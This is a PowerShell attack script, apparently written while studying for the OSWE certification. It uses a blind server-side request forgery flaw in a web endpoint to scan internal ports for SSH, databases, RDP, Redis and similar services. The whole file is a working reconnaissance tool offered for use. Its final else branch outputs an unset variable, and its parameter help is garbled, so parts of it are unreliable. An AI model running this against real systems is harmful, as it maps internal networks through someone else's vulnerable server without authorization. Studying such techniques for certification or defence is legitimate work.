<#
.SYNOPSIS
  This is a simple template script for portscanning via blind SSRF. At the moment it's written to implicitly use POST requests with content type 'application/json'.
.Description
  Enumerating open ports behind a reverse proxy / api gateway.
.PARAMETER Target
  A full uri that we want to scan for.
.PARAMETER SSRF
  The SSRF target that we will scan through.
.PARAMETER Timeout
  Number of seconds before moving onto the next port.
.PARAMETER Open
  Defaults to true, will only show open ports. Setting this to false will all ports.
.PARAMETER Ports
  A list of ports to scan for. The default ports are: ['22','80','443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', '6379','8000','8001','8055','8080','8443','9000']
.OUTPUTS
  Returns PSCustomObject with the corresponding port and response object
.NOTES
  Version:        1.0
  Author:         Zinhart
  Purpose/Change: Created while studying for OSWE certification
.EXAMPLE
  PS> Invoke-SSRFPortScan -Target http://apigateway:8000/files/import -SSRF http://localhost
#>
function Invoke-SSRFPortScan() {
  [cmdletbinding()]
  param(
  [Parameter(Mandatory=$true, HelpMessage='The target URI')]
  [string]$Target,
  [Parameter(Mandatory=$true, HelpMessage='The SSRF target that we will scan through.')]
  [string]$SSRF,
  [Parameter(Mandatory=$false, HelpMessage='Number of seconds before moving onto the next port')]
  [int]$Timeout = 5,
  [Parameter(Mandatory = $false, HelpMessage = 'a list of ports to use.')]
  [String[]] $Ports = @('22','80','443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', '6379','8000','8001','8055','8080','8443','9000'),
  [Parameter(Mandatory=$false, HelpMessage='Show Only Open ports')]
  [switch]$Open
  )
  $results = New-Object -TypeName "System.Collections.ArrayList"
  for ($i = 0; $i -lt $Ports.Length; ++$i) {
    $percent_complete = [System.Math]::Round($i / $Ports.Length * 100)
    $port =  $Ports[$i]
    Write-Progress -Id 1 -Activity "Current Port: $($port)" -Status "$percent_complete% Complete:" -PercentComplete $percent_complete;

    $internal_ip = $SSRF + ":" + $port
    $json = @{"url" = $internal_ip} | ConvertTo-Json

    $res = Invoke-WebRequest -uri $target -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck -TimeoutSec $Timeout
    $res | Add-Member -NotePropertyName Target -NotePropertyValue $internal_ip
    [void]$results.Add($res)
  }
  if($Open) {
    foreach ($result in $results) { 
      $table = $($result.Content | ConvertFrom-Json)
      if($table.errors.message -notlike "*ECONNREFUSED*" ) {
        Write-Output $result | Select-Object -property Target, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength
      }
    }
  }
  else {
    Write-Output $result | Select-Object -property Target, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength
  }
}